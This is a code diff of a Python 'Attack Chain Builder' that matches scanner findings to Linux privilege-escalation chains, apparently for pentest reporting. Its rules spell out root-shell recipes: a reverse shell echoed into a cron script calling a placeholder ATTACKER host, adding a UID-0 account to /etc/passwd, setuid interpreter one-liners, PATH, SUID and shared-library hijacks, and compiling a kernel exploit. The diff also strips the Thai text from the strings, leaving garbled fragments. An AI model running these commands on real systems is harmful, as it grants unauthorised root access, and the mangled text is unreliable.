@@ -1,41 +1,16 @@
 #!/usr/bin/env python3
 """
-  COSVINTE — Attack Chain Builder
-  เชื่อม findings จากทุก scanner เป็น attack path ที่ exploit ได้จริง
-  พร้อม step-by-step และ confidence score
+ COSVINTE — Attack Chain Builder
+ findings scanner attack path exploit 
+ step-by-step confidence score
 """
 
 import os
 from datetime import datetime
 
-# ==============================
-# ANSI Colors
-# ==============================
-class Color:
-    RESET   = "\033[0m"
-    BOLD    = "\033[1m"
-    RED     = "\033[91m"
-    YELLOW  = "\033[93m"
-    GREEN   = "\033[92m"
-    CYAN    = "\033[96m"
-    MAGENTA = "\033[95m"
-    WHITE   = "\033[97m"
-    GRAY    = "\033[90m"
-    ORANGE  = "\033[38;5;208m"
-    BG_RED  = "\033[41m"
-    BLUE    = "\033[94m"
-
-def c(color, text):
-    return f"{color}{text}{Color.RESET}"
-
-def severity_badge(sev):
-    colors = {
-        "CRITICAL": Color.BG_RED + Color.BOLD,
-        "HIGH":     Color.RED + Color.BOLD,
-        "MEDIUM":   Color.YELLOW + Color.BOLD,
-        "LOW":      Color.GREEN,
-    }
-    return f"{colors.get(sev, Color.GRAY)} {sev} {Color.RESET}"
+from cosvinte_utils import (
+    Color, c, severity_badge, print_banner as _print_banner,
+)
 
 # ==============================
 # Chain Rules
@@ -44,17 +19,17 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-001",
         "name": "Cron Job + Writable Script Execution",
-        "name_th": "Cron Job รัน script ที่เขียนทับได้",
-        "description_th": "Cron job รันเป็น root แต่ script ที่ถูกเรียกอยู่ใน directory ที่ทุกคนเขียนได้ ทำให้ฝัง command เข้าไปแล้วรอ cron รัน",
+        "name_th": "Cron Job script ",
+        "description_th": "Cron job root script directory command cron ",
         "severity": "CRITICAL",
         "base_confidence": 90,
         "required_sources": ["cron", "writable"],
         "steps_th": [
-            "ตรวจหา cron job ที่รันเป็น root: crontab -l && ls -la /etc/cron.*",
-            "ยืนยันว่า script เขียนได้: ls -la <script_path>",
-            "ฝัง reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> <script>",
-            "รอ cron ทำงานตามตาราง",
-            "รับ shell: nc -lvnp 4444  →  ROOT SHELL",
+            " cron job root: crontab -l && ls -la /etc/cron.*",
+            " script : ls -la <script_path>",
+            " reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> <script>",
+            " cron ",
+            " shell: nc -lvnp 4444 → ROOT SHELL",
         ],
         "mitre": "T1053.003",
         "conditions": [
@@ -65,16 +40,16 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-002",
         "name": "Writable PATH Dir + Cron Command Hijack",
-        "name_th": "PATH Directory เขียนได้ + Cron ใช้ relative command",
-        "description_th": "มี directory ใน PATH ที่เขียนได้ และ cron job เรียก command โดยไม่ระบุ absolute path ทำให้วาง binary ปลอมเพื่อให้ cron รันแทน",
+        "name_th": "PATH Directory + Cron relative command",
+        "description_th": " directory PATH cron job command absolute path binary cron ",
         "severity": "CRITICAL",
         "base_confidence": 85,
         "required_sources": ["path", "cron"],
         "steps_th": [
-            "ตรวจสอบ PATH: echo $PATH  แล้วดูแต่ละ dir ด้วย ls -ld",
-            "ค้นหา cron command ที่ไม่มี / นำหน้า: grep -r '' /etc/cron.* | grep -v '/'",
-            "สร้าง binary ปลอมใน writable PATH dir: echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/<cmd> && chmod +x /tmp/<cmd>",
-            "รอ cron รัน  →  /bin/bash -p  →  ROOT SHELL",
+            " PATH: echo $PATH dir ls -ld",
+            " cron command / : grep -r '' /etc/cron.* | grep -v '/'",
+            " binary writable PATH dir: echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/<cmd> && chmod +x /tmp/<cmd>",
+            " cron → /bin/bash -p → ROOT SHELL",
         ],
         "mitre": "T1574.007",
         "conditions": [
@@ -85,17 +60,17 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-003",
         "name": "Dangerous Capability on Interpreter",
-        "name_th": "Interpreter (python/perl/ruby) มี cap_setuid",
-        "description_th": "Python, Perl, Ruby หรือ Node มี cap_setuid ทำให้รัน one-liner เพื่อเป็น root ได้ทันทีโดยไม่ต้องรอ",
+        "name_th": "Interpreter (python/perl/ruby) cap_setuid",
+        "description_th": "Python, Perl, Ruby Node cap_setuid one-liner root ",
         "severity": "CRITICAL",
         "base_confidence": 95,
         "required_sources": ["caps"],
         "steps_th": [
-            "ยืนยัน capability: getcap <binary_path>",
+            " capability: getcap <binary_path>",
             "Python: <binary> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
             "Perl:   <binary> -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'",
             "Ruby:   <binary> -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
-            "→  ROOT SHELL ทันที",
+            "→ ROOT SHELL ",
         ],
         "mitre": "T1548.001",
         "conditions": [
@@ -107,16 +82,16 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-004",
         "name": "Writable /etc/passwd → Add Root Account",
-        "name_th": "/etc/passwd เขียนได้ → เพิ่ม root account โดยตรง",
-        "description_th": "ถ้า /etc/passwd เขียนได้ ผู้โจมตีเพิ่ม user ใหม่ที่มี UID=0 ได้ทันที เป็น chain ที่ง่ายและได้ผลแน่นอนที่สุด",
+        "name_th": "/etc/passwd → root account ",
+        "description_th": " /etc/passwd user UID=0 chain ",
         "severity": "CRITICAL",
         "base_confidence": 99,
         "required_sources": ["writable"],
         "steps_th": [
-            "ยืนยันว่าเขียนได้: ls -la /etc/passwd",
-            "สร้าง password hash: openssl passwd -1 -salt xyz P@ssword123",
-            "เพิ่ม root user: echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
-            "สลับ user: su hacker  →  ROOT SHELL",
+            ": ls -la /etc/passwd",
+            " password hash: openssl passwd -1 -salt xyz P@ssword123",
+            " root user: echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
+            " user: su hacker → ROOT SHELL",
         ],
         "mitre": "T1136.001",
         "conditions": [
@@ -127,17 +102,17 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-005",
         "name": "Kernel Exploit + Weakened Memory Protections",
-        "name_th": "Kernel มีช่องโหว่ + ASLR/SMEP ถูกปิด",
-        "description_th": "พบ kernel CVE และ memory protection อ่อนแอ (ASLR=0) ทำให้ exploit kernel สำเร็จง่ายขึ้นมาก",
+        "name_th": "Kernel + ASLR/SMEP ",
+        "description_th": " kernel CVE memory protection (ASLR=0) exploit kernel ",
         "severity": "CRITICAL",
         "base_confidence": 75,
         "required_sources": ["kernel"],
         "steps_th": [
-            "ยืนยัน kernel version: uname -r",
-            "ตรวจ ASLR: cat /proc/sys/kernel/randomize_va_space  (0=ปิด=ง่าย)",
-            "ตรวจ SMEP: grep -m1 flags /proc/cpuinfo | grep smep",
-            "Download PoC จาก exploit-db สำหรับ CVE ที่ match",
-            "Compile และรัน: gcc exploit.c -o pwn && ./pwn  →  ROOT SHELL",
+            " kernel version: uname -r",
+            " ASLR: cat /proc/sys/kernel/randomize_va_space (0==)",
+            " SMEP: grep -m1 flags /proc/cpuinfo | grep smep",
+            "Download PoC exploit-db CVE match",
+            "Compile : gcc exploit.c -o pwn && ./pwn → ROOT SHELL",
         ],
         "mitre": "T1068",
         "conditions": [
@@ -148,16 +123,16 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-006",
         "name": "SUID Binary + Writable Library Directory",
-        "name_th": "SUID Binary โหลด library จาก directory ที่เขียนได้",
-        "description_th": "SUID binary โหลด shared library จาก directory ที่เขียนได้ ทำให้วาง .so ปลอมแล้ว binary นั้นโหลด code ของเราในฐานะ root",
+        "name_th": "SUID Binary library directory ",
+        "description_th": "SUID binary shared library directory .so binary code root",
         "severity": "CRITICAL",
         "base_confidence": 78,
         "required_sources": ["path", "writable"],
         "steps_th": [
-            "หา SUID binary: find / -perm -4000 -type f 2>/dev/null",
-            "ตรวจ library ที่โหลด: ldd <binary>  แล้วดูว่า .so ใดอยู่ใน writable dir",
-            "สร้าง malicious .so: gcc -shared -fPIC -o /writable_dir/target.so payload.c",
-            "รัน SUID binary  →  โหลด .so ในฐานะ root  →  ROOT SHELL",
+            " SUID binary: find / -perm -4000 -type f 2>/dev/null",
+            " library : ldd <binary> .so writable dir",
+            " malicious .so: gcc -shared -fPIC -o /writable_dir/target.so payload.c",
+            " SUID binary → .so root → ROOT SHELL",
         ],
         "mitre": "T1574.006",
         "conditions": [
@@ -168,17 +143,17 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-007",
         "name": "cap_dac_override + Overwrite SUID Binary",
-        "name_th": "cap_dac_override ใช้เขียนทับ SUID binary",
-        "description_th": "Binary ที่มี cap_dac_override ข้าม permission check ทุกอย่าง ใช้เขียนทับ SUID binary (เช่น /usr/bin/passwd) ด้วย payload",
+        "name_th": "cap_dac_override SUID binary",
+        "description_th": "Binary cap_dac_override permission check SUID binary ( /usr/bin/passwd) payload",
         "severity": "CRITICAL",
         "base_confidence": 82,
         "required_sources": ["caps", "path"],
         "steps_th": [
-            "ยืนยัน cap_dac_override: getcap <binary>",
-            "หา SUID binary เป้าหมาย: find / -perm -4000 2>/dev/null",
-            "สร้าง payload: echo -e '#!/bin/bash\\nbash -p' > /tmp/payload && chmod +x /tmp/payload",
-            "เขียนทับ SUID: <cap_binary> cp /tmp/payload /usr/bin/passwd",
-            "รัน /usr/bin/passwd  →  ROOT SHELL",
+            " cap_dac_override: getcap <binary>",
+            " SUID binary : find / -perm -4000 2>/dev/null",
+            " payload: echo -e '#!/bin/bash\\nbash -p' > /tmp/payload && chmod +x /tmp/payload",
+            " SUID: <cap_binary> cp /tmp/payload /usr/bin/passwd",
+            " /usr/bin/passwd → ROOT SHELL",
         ],
         "mitre": "T1574.010",
         "conditions": [
@@ -190,16 +165,16 @@ CHAIN_RULES = [
     {
         "id": "CHAIN-008",
         "name": "Relative PATH Entry + SUID Subcommand Hijack",
-        "name_th": "PATH มี relative entry + SUID เรียก command ไม่ระบุ path",
-        "description_th": "มี '.' ใน PATH และ SUID binary เรียก sub-command แบบ relative ทำให้ hijack ได้จาก current directory",
+        "name_th": "PATH relative entry + SUID command path",
+        "description_th": " '.' PATH SUID binary sub-command relative hijack current directory",
         "severity": "HIGH",
         "base_confidence": 70,
         "required_sources": ["path"],
         "steps_th": [
-            "ยืนยัน relative PATH: echo $PATH  (มอง '.' หรือ path ไม่มี /)",
-            "หา SUID binary ที่เรียก command relative: strings <suid_binary> | grep -v '/' | grep -E '^[a-z]'",
-            "สร้าง script ปลอมใน current dir: echo -e '#!/bin/bash\\nbash -p' > ./<cmd> && chmod +x ./<cmd>",
-            "รัน SUID binary จาก directory นั้น  →  command ถูก hijack  →  ROOT SHELL",
+            " relative PATH: echo $PATH ( '.' path /)",
+            " SUID binary command relative: strings <suid_binary> | grep -v '/' | grep -E '^[a-z]'",
+            " script current dir: echo -e '#!/bin/bash\\nbash -p' > ./<cmd> && chmod +x ./<cmd>",
+            " SUID binary directory → command hijack → ROOT SHELL",
         ],
         "mitre": "T1574.007",
         "conditions": [
@@ -357,16 +332,7 @@ def _confidence_bar(conf: int, width: int = 20) -> str:
     return f"{col}{bar}{Color.RESET} {Color.BOLD}{conf}%{Color.RESET}"
 
 def print_banner():
-    print(f"""
-{Color.CYAN}{Color.BOLD}
- ██████╗ ██████╗ ███████╗██╗   ██╗██╗███╗   ██╗████████╗███████╗
-██╔════╝██╔═══██╗██╔════╝██║   ██║██║████╗  ██║╚══██╔══╝██╔════╝
-██║     ██║   ██║███████╗██║   ██║██║██╔██╗ ██║   ██║   █████╗
-██║     ██║   ██║╚════██║╚██╗ ██╔╝██║██║╚██╗██║   ██║   ██╔══╝
-╚██████╗╚██████╔╝███████║ ╚████╔╝ ██║██║ ╚████║   ██║   ███████╗
- ╚═════╝ ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝{Color.RESET}
-{Color.GRAY}  Attack Chain Builder  |  "Conquer Vulnerabilities"{Color.RESET}
-""")
+    _print_banner('Attack Chain Builder  |  "Conquer Vulnerabilities"')
 
 def print_mem_protections(mem: dict):
     print(c(Color.CYAN + Color.BOLD, "  ╔══ MEMORY PROTECTIONS ══════════════════════════════════════╗"))
@@ -384,12 +350,12 @@ def print_mem_protections(mem: dict):
 
 def print_chains(chains: list):
     if not chains:
-        print(c(Color.GREEN + Color.BOLD, "\n  ✔  ไม่พบ Attack Chain จาก findings ที่มี\n"))
+        print(c(Color.GREEN + Color.BOLD, "\n ✔ Attack Chain findings \n"))
         return
 
     crit = sum(1 for ch in chains if ch["severity"] == "CRITICAL")
     high = sum(1 for ch in chains if ch["severity"] == "HIGH")
-    print(c(Color.RED + Color.BOLD, f"\n  ⚡  พบ {len(chains)} ATTACK CHAIN  ({crit} CRITICAL, {high} HIGH)\n"))
+    print(c(Color.RED + Color.BOLD, f"\n ⚡ {len(chains)} ATTACK CHAIN ({crit} CRITICAL, {high} HIGH)\n"))
 
     for idx, chain in enumerate(chains, 1):
         sev     = chain["severity"]
@@ -406,7 +372,7 @@ def print_chains(chains: list):
         print(f"  {c(Color.CYAN,'║')}")
 
         # Description Thai (word wrap)
-        print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,'📋 สรุป:')}")
+        print(f" {c(Color.CYAN,'║')} {c(Color.GRAY,'📋 :')}")
         words, line = chain["description_th"].split(), ""
         for word in words:
             if len(line) + len(word) + 1 > 60:
@@ -419,7 +385,7 @@ def print_chains(chains: list):
 
         # Steps
         print(f"  {c(Color.CYAN,'║')}")
-        print(f"  {c(Color.CYAN,'║')}  {c(Color.YELLOW+Color.BOLD,'⚡ ขั้นตอนการโจมตี:')}")
+        print(f" {c(Color.CYAN,'║')} {c(Color.YELLOW+Color.BOLD,'⚡ :')}")
         for i, step in enumerate(chain["steps_th"], 1):
             lines = step.split("\n")
             print(f"  {c(Color.CYAN,'║')}    {c(Color.ORANGE, str(i)+'.')} {c(Color.GRAY, lines[0])}")
@@ -428,14 +394,14 @@ def print_chains(chains: list):
 
         # Evidence
         print(f"  {c(Color.CYAN,'║')}")
-        print(f"  {c(Color.CYAN,'║')}  {c(Color.GREEN,'🔍 Evidence ที่พบ:')}")
+        print(f" {c(Color.CYAN,'║')} {c(Color.GREEN,'🔍 Evidence :')}")
         for src, items in chain["evidence"].items():
             for item in items[:2]:
                 label    = (item.get("cve") or item.get("binary") or item.get("path") or str(item)[:40])
                 sev_item = item.get("severity", item.get("status", ""))
                 print(f"  {c(Color.CYAN,'║')}    {c(Color.GRAY, f'[{src}]')} {c(Color.WHITE, str(label))}  {c(Color.YELLOW, sev_item) if sev_item else ''}")
             if len(items) > 2:
-                print(f"  {c(Color.CYAN,'║')}    {c(Color.GRAY, f'  ... และอีก {len(items)-2} รายการ')}")
+                print(f" {c(Color.CYAN,'║')} {c(Color.GRAY, f' ... {len(items)-2} ')}")
 
         print(f"  {c(hdr_col, '╚══════════════════════════════════════════════════════════════')}\n")
 
@@ -451,7 +417,7 @@ def print_summary(chains: list):
     print(f"  {c(Color.CYAN,'║')}  {c(Color.RED,   '  HIGH                 :')} {c(Color.RED+Color.BOLD, str(high))}")
     print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,  'Avg Confidence        :')} {c(Color.YELLOW+Color.BOLD, f'{avg_conf}%')}")
     print(f"  {c(Color.CYAN,'║')}")
-    print(f"  {c(Color.CYAN,'║')}  {c(Color.YELLOW,'⚠  ดู Remediation Roadmap เพื่อแผนการแก้ไขที่เหมาะสม')}")
+    print(f" {c(Color.CYAN,'║')} {c(Color.YELLOW,'⚠ Remediation Roadmap ')}")
     print(c(Color.CYAN+Color.BOLD, '  ╚══════════════════════════════════════════════════════════════╝\n'))
 
 def chains_to_report_dict(chains: list) -> list:
